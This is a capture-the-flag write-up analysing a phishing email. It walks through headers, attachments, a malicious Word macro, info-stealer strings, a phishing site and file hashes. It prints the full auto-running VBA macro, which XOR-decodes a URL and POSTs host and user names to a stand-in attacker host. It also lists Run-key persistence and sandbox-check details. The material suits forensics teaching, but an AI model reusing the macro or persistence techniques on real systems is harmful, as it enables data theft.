---
date: 2026-09-27
---
# DPhish — Phishing Email Analysis

<!-- more -->

[🇪🇬 اقرأ بالعربي](../dPhish2026-ar.md){ .md-button }

CTF Writeup + Learning

> *We’re going to solve the challenge while thinking like an actual Forensics Engineer.*

> بسم الله :)

![](https://miro.medium.com/v2/resize:fit:875/1*ka8Hc2lUIE5c-Dq0k318oA.png)

## Challenge Description

File: `challenge.eml`

Chaallenge link : [text](https://drive.google.com/file/d/16WlDYp2nNKCwnl8IIUDpSLUZ0EewgLjI/view?usp=sharing)

DPhish — Phishing Email Analysis

You are a SOC analyst at ByPaid Solutions. An employee named Babar has reported a suspicious email they received from the HR department.

Your job is to investigate this email thoroughly:

* Analyze the email headers to trace the true origin of this message
* Examine all attachments — some may contain malicious content, and not all of them are immediately visible
* Investigate the linked website referenced in the email body
* Reverse-engineer any binaries or macros found in the attachments

Rules:

* All analysis must be performed in an isolated VM/sandbox environment
* Answers are case-insensitive
* Some questions have limited attempts — read carefully before submitting
* Hints are available but cost 100 points each

## Getting Started — Opening the File

First we open it on an isolated VM, because there might be malware in the attachments that auto-executes when we open the email — so let’s be careful.

```
cat challenge.eml
```

## Warm-up: Subject Line

Question: What is the subject line of the phishing email?

Answer: `Urgent: Employee Salary Revision and Policy`

## Phase 1 — Email Headers Analysis

## Q1 — Mail Gateway Hostname

Question: What is the hostname of the mail gateway that actually sent this email? (found in the Received header)![](https://miro.medium.com/v2/resize:fit:875/1*Cx9fX_PAY1_bxoffpHYPfg.png)

If you pay attention to the Received header you’ll find:

```
Received: from mail.evil.owndomain.online by mx.bf456
```

So it originally came from `mail.evil.owndomain.online` — someone picked it up and forwarded it to the domain hiding the main server. This is the attacker's actual server that's hosting the domain shown in the `From` field above.

> *The attacker can easily forge* `<em class="hh">From: hr@bypaid.io</em>`*. But Received headers get added by every mail server along the way — that's much harder to fake.*

Answer: `mail.evil.owndomain.online`

## Q2 — Originating IP Address

Question: What is the originating IP address of the sender?

The IP is right next to the hostname in the same Received header.

![](https://miro.medium.com/v2/resize:fit:351/1*DhvBJeOvAswtE78-p8PJCg.png)

Answer: `185.199.42.13`

## Q3 — SPF Verification Result

Question: What is the SPF verification result for this email?

This is one of the three most important protocols in Header Analysis:

ProtocolWhat it does
SPF : Is this IP allowed to send on behalf of this domain?
DKIM : Was the email digitally signed by the domain?
DMARC : What happens if SPF or DKIM fail?

It’s asking about SPF, so the answer is `softfail` — meaning the IP is suspicious, but the mail gateway's rules let it through to spam instead of outright rejecting it.

![](https://miro.medium.com/v2/resize:fit:845/1*ZrQKO-YgqoDk0fcKZ4qFTQ.png)

Answer: `softfail`

## Q4 — Reply-To Email Address

Question: What is the Reply-To email address?

Normally: `From == Reply-To`

But in this email, if you look carefully you’ll find:

```
From:     hr@bypaid.io                        ← looks legit to the victim
Reply-To: hr-support@evil.owndomain.online    ← hidden! 🚨
```

![](https://miro.medium.com/v2/resize:fit:449/1*GgyaM_20XOM2rO6JkNv8Xw.png)

Answer: `hr-support@evil.owndomain.online`

## Q5 — Mail Client / Tool Used

Question: What mail client or tool was used to send this email? (include version)

![](https://miro.medium.com/v2/resize:fit:261/1*m8WN1Drt_WwPYBp_wvo-zQ.png)

Answer: `PyMailer 3.2.1`

## Q6 — Message-ID Domain

Question: What is the domain found in the Message-ID header?

![](https://miro.medium.com/v2/resize:fit:726/1*5rNVXcWJkrD86r9D_Gi3Hw.png)

Answer: `evil.owndomain.online`

## Phase 2 — Attachments Analysis

What engine/tool was used to create the PDF file? (include version)

Okay so it’s asking about the tool that made the PDF.
What PDF?
Are there even files in the email?
If you scroll down a bit you’ll find the analysis for:

![](https://miro.medium.com/v2/resize:fit:695/1*kEMGk3hePYq-MNJdHO4vlg.png)

- the email body itself

![](https://miro.medium.com/v2/resize:fit:695/1*FTBm_C4w4TTUGNuD9wE4ow.png)

- Salary\_Report\_2026.pdf

![](https://miro.medium.com/v2/resize:fit:695/1*HdcC8qKVwiDdmQ9SLATMkA.png)

- Policy\_Update.doc

![](https://miro.medium.com/v2/resize:fit:695/1*iI4IYANneGmlQ1SjQB_-Yw.png)

-Meeting\_Invite.ics - Update\_Tool.exe

![](https://miro.medium.com/v2/resize:fit:695/1*tSCUrDeDgeng-spJKLlnRw.png)

- text/html

## Extracting the Files

Let’s extract the files from the email with a simple script:

```
python3 << 'EOF'
import email
with open('challenge.eml', 'rb') as f:
    msg = email.message_from_binary_file(f)
for part in msg.walk():
    fn = part.get_filename()
    # ask each part: do you have a filename?
    if fn:
    # if yes → it's an attachment
        data = part.get_payload(decode=True)
        # get_payload(decode=True):
        # - give me the file contents
        # - decode=True: if the content is base64 encoded (as in MIME), decode it first
        open(fn, 'wb').write(data)
        # save the content in a file with its original name
        # 'wb' = write + binary
        print(f"✅ {fn} ({len(data):,} bytes)")
EOF
```

Output:

```
✅ Policy_Update.doc       (35,840 bytes)
✅ Meeting_Invite.ics      (760 bytes)
✅ Update_Tool.exe         (490,496 bytes)
✅ Salary_Report_2026.pdf  (2,764 bytes)
```

## Verifying the Files

We want more details about the files and to confirm their extensions — maybe something changed or there’s a double extension:

```
file Policy_Update.doc Meeting_Invite.ics Update_Tool.exe Salary_Report_2026.pdf
```

```
Policy_Update.doc  → Composite Document File V2 Document  (= OLE format = old Word)
Meeting_Invite.ics → ASCII text
Update_Tool.exe    → PE32+ executable x86-64, for MS Windows
Salary_Report.pdf  → PDF document, version 1.4
```

![](https://miro.medium.com/v2/resize:fit:695/1*McIdV9QLIWcACfsXv1djCw.png)

## Phase 3 — PDF Analysis

## Q7 — PDF Creation Tool

Question: What engine/tool was used to create the PDF file? (include version)

We use `exiftool` to see all the metadata:

```
exiftool Salary_Report_2026.pdf
```

![](https://miro.medium.com/v2/resize:fit:695/1*ZRTuG4VGpYocNY-g70g-SQ.png)

You’ll find under Creator: `wkhtmltopdf 0.12.6` — a tool that converts HTML pages to PDF.

> *Important difference:*

* Creator = the program that made the original content → `wkhtmltopdf` (converts HTML → PDF)
* Producer = the PDF library that generated the actual PDF file → `ReportLab`

> *So the attacker built a professional-looking HTML page and converted it to PDF.*

Answer: `wkhtmltopdf 0.12.6`

## All Questions Coming later is Answered By Same Screenshot too

![](https://miro.medium.com/v2/resize:fit:695/1*ZRTuG4VGpYocNY-g70g-SQ.png)

## Q8 — PDF Author

Question: Who is listed as the Author in the PDF metadata?

Answer: `dphish_admin`

## Q9 — PDF Producer

Question: What is the Producer listed in the PDF metadata? (include version)

Answer: `ReportLab v4.1`

## Q10 — Custom Reference Keyword

Question: What is the custom reference keyword hidden in the PDF metadata?

> *This reference keyword is used for emails that have an auto-reply configured.*

Answer: `CTF-2026-PHISH`

## Q11 — Employee ID

Question: What is the Employee ID of the highlighted employee in the salary table?

![](https://miro.medium.com/v2/resize:fit:695/1*2qdQg2OG31bffmI9U-3Thw.png)

Answer: `EMP-2026-4491`

## Phase 4 — VBA Macro Analysis

## How Did We Know There’s a Macro?

Going back to the `file` command result:

```
Policy_Update.doc → Composite Document File V2 Document (= OLE format = old Word)
```

Older versions of Office used the same `.doc` extension for both regular files and macro-enabled files — unlike newer versions where regular files are `.docx` and macro files are `.docm`.

Also the command told us it’s OLE format — what does that mean?

> *OLE = Object Linking and Embedding A format/structure that bundles different types of data inside a single file. There’s a tool that unpacks this structure — and that’s exactly what we need.*

```
olevba Policy_Update.doc
```

![](https://miro.medium.com/v2/resize:fit:875/1*98F2V_sVUj1exqv12eE_2Q.png)

![](https://miro.medium.com/v2/resize:fit:695/1*1PnE7x0oMN3E1lABjFMcog.png)

If you read the table you’ll find `AutoExec` — that means it's a macro. And if you notice `MSXML2.XMLHTTP` — that's the server it connects to. Plus `XOR` — and from that we knew it's a C2.

## Full Macro Code

```
'─────────────────────────────────────────────────────
' Triggers — run automatically when the file is opened
'─────────────────────────────────────────────────────
Sub AutoOpen()
    InitUpdate          ' ← calls InitUpdate immediately
End Sub
Sub Document_Open()     ' ← same thing, for compatibility with different versions
    InitUpdate
End Sub
'─────────────────────────────────────────────────────
' The real code - InitUpdate is the auto-execute subroutine
'─────────────────────────────────────────────────────
Sub InitUpdate()
    Dim encodedUrl() As Variant
    Dim xorKey As Byte
    Dim decodedUrl As String
    Dim i As Long
    xorKey = &H4D       ' XOR key = 0x4D (= 77 decimal)
    ' URL is obfuscated - can't read it directly
    encodedUrl = Array(&H25, &H39, &H39, &H3D, &H77, &H62, &H62, &H28, _
                       &H3B, &H24, &H21, &H63, &H22, &H3A, &H23, &H29, _
                       &H22, &H20, &H2C, &H24, &H23, &H63, &H22, &H23, _
                       &H21, &H24, &H23, &H28, &H62, &H2C, &H3D, &H24, _
                       &H62, &H2E, &H22, &H21, &H21, &H28, &H2E, &H39)
    ' Decode - XOR each byte with the key
    decodedUrl = ""
    For i = LBound(encodedUrl) To UBound(encodedUrl)
        decodedUrl = decodedUrl & Chr(CLng(encodedUrl(i)) Xor xorKey)
    Next i
    ' Collect machine info
    Dim computerName As String
    Dim userName As String
    computerName = Environ("COMPUTERNAME")   ' machine name
    userName     = Environ("USERNAME")       ' username
    ' Send data to C2 via HTTP POST
    Dim objHTTP As Object
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    objHTTP.Open "POST", decodedUrl, False
    objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    objHTTP.send "host=" & computerName & "&user=" & userName
    Set objHTTP = Nothing
End Sub
'─────────────────────────────────────────────────────
' Dead Code - written but never called from anywhere!
'─────────────────────────────────────────────────────
Sub VerifyPolicy()
    Dim policyHash As String
    policyHash = "A1B2C3D4E5F6"    ' ← fake data
    Dim statusCode As Long
    statusCode = 0
End Sub
```

Start To Answer By this code

## Q12 — XOR Key

Question: What is the XOR key used to obfuscate the URL in the macro? (hex format, e.g. 0xAB)

If you focus on the code you’ll find: `xorKey = &H4D`

Answer: `0x4D`

## Q13 — Deobfuscated C2 URL

Question: What is the full deobfuscated C2 URL in the macro?

You’ll find the `encodedUrl` in the code — we put it in CyberChef and got back:

encodedUrl = Array(&H25, &H39, &H39, &H3D, &H77, &H62, &H62, &H28, &H3B, &H24, &H21, &H63, &H22, &H3A, &H23, &H29, &H22, &H20, &H2C, &H24, &H23, &H63, &H22, &H23, &H21, &H24, &H23, &H28, &H62, &H2C, &H3D, &H24, &H62, &H2E, &H22, &H21, &H21, &H28, &H2E, &H39)

Answer: `<a class="as rf" href="http://evil.owndomain.online/api/collect" rel="noopener ugc nofollow" target="_blank">http://evil.owndomain.online/api/collect</a>`

## Q14 — HTTP Method

Question: What method does the macro use to send data to the C2?

If you look at the code you’ll find: `objHTTP.Open "POST"`

Answer: `POST`

## Q15 — Auto-execute Subroutine

Question: What is the name of the main auto-execute subroutine that performs the malicious action?

The name of the function where we found the URL was `InitUpdate`.

Answer: `InitUpdate`

## Q16 — Dead Code Function

Question: What is the name of the dead code function that is never called?

> *Dead Code means code that’s written just to look legit, but is never called — or gets called but isn’t a core function.*

You’ll find it: `VerifyPolicy`

Answer: `VerifyPolicy`

## Q17 — Department Code

Question: What is the Department Code found in the document content?

![](https://miro.medium.com/v2/resize:fit:695/1*ffkmWJllOqXHUJCvZguxMg.png)

Answer: `FIN-0042`

## Phase 5 — EXE Binary Analysis

## Q18 — EXE C2 URL

Question: What is the full C2 server URL used by the executable for data exfiltration?

The link we found earlier was `/collect` and only sends hostname + username. So we're expecting to find something else that sends all the actual data.

Remember the tool we used earlier? `wkhtmltopdf` — and we said it converts HTML → PDF.

```
The attacker builds a phishing PDF:
  1. Makes an HTML page that looks like a legit HR portal
  2. Converts it to PDF using wkhtmltopdf
  3. Embeds a link to the fake website
  And the Creator shows up as "wkhtmltopdf"
```

Let’s look at the PDF again — `file` command said: `PDF document, version 1.4`.

Didn’t get much from that. Let’s try pulling all the strings from the binary?

> *The* `<em class="hh">endstream</em>` *isn't a URL — it's just part of the PDF structure itself.*

Let’s try the other file — the exe: `Update_Tool.exe`

Nothing obvious in the metadata. Could run it through IDA, but let’s quickly check with `strings` first:

```
strings Update_Tool.exe
```

![](https://miro.medium.com/v2/resize:fit:875/1*spUJNTZevKBTeVlKxstELw.png)

There it is — and `/upload` too, so the answer is:

Answer: `<a class="as rf" href="http://evil.owndomain.online/upload" rel="noopener ugc nofollow" target="_blank">http://evil.owndomain.online/upload</a>`

## All Questions Coming later is Answered By Same Screenshot too

## Q19 — Registry Key Path

Question: What is the full registry key path used for persistence?

The most common registry keys used for persistence:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run      ← no Admin needed
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run      ← Admin required
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

KeyPrivilegeWhen it runsHKCUNo Admin neededEvery startup, current user onlyHKLMAdmin requiredEvery startup, all usersRun — Every startupRunOnce — Runs once then deletes itself

![](https://miro.medium.com/v2/resize:fit:585/1*19PToo0XKHndBRlUcIq69A.png)

You’ll find: `Software\Microsoft\Windows\CurrentVersion\Run`

Answer: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`

## Q20 — Registry Value Name

Question: What is the registry value name used for the persistence entry?

> *What’s the difference between a Key and a Value?*
>
> `<em class="hh">Key = the folder (HKCU\...\Run)</em>`
>
> `<em class="hh">Value = the entry inside the folder HKCU\...\Run └── WindowsUpdateSvc = C:\...\Update_Tool.exe ↑ Value Name ↑ Value Data</em>`

Answer: `WindowsUpdateSvc`

## Q21 — Target Applications

Question: Name the three applications whose data the malware targets (comma-separated, alphabetical order)

![](https://miro.medium.com/v2/resize:fit:590/1*LGRcVxU5TxGjdMy9_OAx6g.png)

Answer: `Discord, Google Chrome, Mozilla Firefox`

## Q22 — User-Agent String

Question: What is the full User-Agent string used in HTTP requests by the malware?

![](https://miro.medium.com/v2/resize:fit:503/1*P_vXPR5oLH5X5GkD8RkOfQ.png)

Answer: `Mozilla/5.0 (compatible; UpdateService/1.0)`

## Q23 — Mutex Name

Question: What is the mutex name created by the malware?

> *What’s a Mutex?*
>
> *Mutex = Mutual Exclusion = a lock*
>
> *If two instances of the malware are running at the same time, they could conflict and cause issues. The Mutex prevents that:*

* First instance creates a mutex with a specific name
* Second instance finds the mutex already exists → shuts itself down

Usually it’s a random name you’d find through the API it uses like `CreateMutex | OpenMutex | WaitForSingle`, but in our code here we found it with a plain readable name:

![](https://miro.medium.com/v2/resize:fit:639/1*1rO-uiGBM_2hAUpEH_Pu0g.png)

Answer: `Global\DPhishMutex2026`

## Q24 — VM/Sandbox Detection

Question: Name one process the malware checks for during VM/sandbox detection.

The first thing the malware checks to confirm it’s in a real environment vs a sandbox — it looks for names like:

```
vbox | vmware | sandbox | qemu | procmon | wireshark
```

![](https://miro.medium.com/v2/resize:fit:505/1*4YZLMTGAawbWV8VF6KKsPg.png)

Answer: `vmtoolsd.exe`

## Q25 — Target File Extensions

Question: What file extensions does the malware search for? (comma-separated, alphabetical)

```
.dat    ← browser data files (cookies, credentials)
.txt    ← text files that might contain passwords or notes
.wallet ← Cryptocurrency wallet files
```

![](https://miro.medium.com/v2/resize:fit:875/1*bBLMY44meguJ_V9QvBx64A.png)

Answer: `.dat,.txt,.wallet`

## Phase 6 — Phishing Website

## Q26 — Verification PIN

Question: What is the Verification PIN?

Now we start looking at the phishing link — all of this on the sandbox.

We’ll find a page that looks like a login portal. For the scenario we have, it probably targets the user who was highlighted in the salary table.

![](https://miro.medium.com/v2/resize:fit:695/1*H9JphtD4GZS8zOCGZgkb6A.png)

Remember at the very beginning of the writeup when `text/html` showed up? We didn't know what to do with it — let's try decoding it now:

```
python3 << 'EOF'
import email
with open('challenge.eml', 'rb') as f:
    msg = email.message_from_binary_file(f)
for part in msg.walk():
    if part.get_content_type() == 'text/html':
        print(part.get_payload(decode=True).decode('utf-8', errors='ignore'))
EOF
```

This gives us the full HTML source of the email body and at the end you’ll find the PIN.

![](https://miro.medium.com/v2/resize:fit:695/1*5ZkPhxq1iLnZLT3UlJjWHQ.png)

Answer: `729314`

## Q27 — Transaction ID

Question: What is the Transaction ID displayed?

After logging in with everything, the Transaction ID shows up.

![](https://miro.medium.com/v2/resize:fit:695/1*O7mhVcjVuKQ2r3TU8W7nXw.png)

Answer: `TXN-8A3F-QZ91`

## Q28 — Internal Reference Number

Question: What is the Internal Reference Number shown on the success page?

Answer: `REF-DPHISH-2026-0042`

## Phase 7 — File Hashes

## Q29 — SHA256 of VBA Macro File

Question: What is the SHA256 hash of the attached file that contains a VBA macro?

```
sha256sum Policy_Update.doc
```

![](https://miro.medium.com/v2/resize:fit:695/1*Pm8p6ttxQwSqVSo_6oLivg.png)

Answer: `2fed17ccf194e2b63734571b2a3b122363779ce920c20dc84798387de87a638`

## Q30 — SHA256 of Info-Stealer

Question: What is the SHA256 hash of the compiled info-stealer malware hidden in the email?

That means the exe obviously.

```
sha256sum Update_Tool.exe
```

![](https://miro.medium.com/v2/resize:fit:695/1*Pm8p6ttxQwSqVSo_6oLivg.png)

Answer: `6b8f21832549f4a61e66dfd910196146e152a03f00ab0b2c11f06e7c7a01025e`

## Summary — IOC Report

```
╔══════════════════════════════════════════════════════════╗
║              DPhish Campaign — IOC Summary               ║
╠══════════════════════════════════════════════════════════╣
║ EMAIL                                                    ║
║  Sender IP    : 185.199.42.13                            ║
║  Mail Gateway : mail.evil.owndomain.online               ║
║  Mail Client  : PyMailer 3.2.1                           ║
║  Reply-To     : hr-support@evil.owndomain.online         ║
║  SPF Result   : softfail                                 ║
╠══════════════════════════════════════════════════════════╣
║ PDF METADATA                                             ║
║  Author       : dphish_admin                             ║
║  Creator      : wkhtmltopdf 0.12.6                       ║
║  Producer     : ReportLab v4.1                           ║
║  Keywords     : CTF-2026-PHISH                           ║
╠══════════════════════════════════════════════════════════╣
║ NETWORK                                                  ║
║  Macro C2     : http://evil.owndomain.online/api/collect ║
║  EXE C2       : http://evil.owndomain.online/upload      ║
╠══════════════════════════════════════════════════════════╣
║ HOST                                                     ║
║  Registry     : HKCU\...\CurrentVersion\Run              ║
║  Value Name   : WindowsUpdateSvc                         ║
║  Mutex        : Global\DPhishMutex2026                   ║
║  VM Check     : vmtoolsd.exe                             ║
╠══════════════════════════════════════════════════════════╣
║ FILE HASHES                                              ║
║  Policy_Update.doc  : 2fed17cc...a638                    ║
║  Update_Tool.exe    : 6b8f2183...25e                     ║
╚══════════════════════════════════════════════════════════╝
```

## Notes for a Real Investigation

Some steps we didn’t use here — but would matter in a real investigation:

Email Threading: Are there other emails from the same attacker? Same campaign?

Lateral Movement Check: Was this email sent to other people in the company?

```
grep -iE "^To:|^CC:" challenge.eml
```

Timestamp Analysis: Does the timing in the headers make sense? Are the timezones in the Received headers consistent?

BCC Detection: The email might have been sent to a large number of people in BCC.

Threat Intelligence: Verify every IP and URL we found against threat intel platforms (VirusTotal, OTX AlienVault).

Dynamic Analysis: We didn’t really need it here since the exe wasn’t heavily obfuscated — static analysis was enough.

> *That’s all — if I got it right, it’s from Allah, and if I made mistakes, that’s from myself or the devil.*
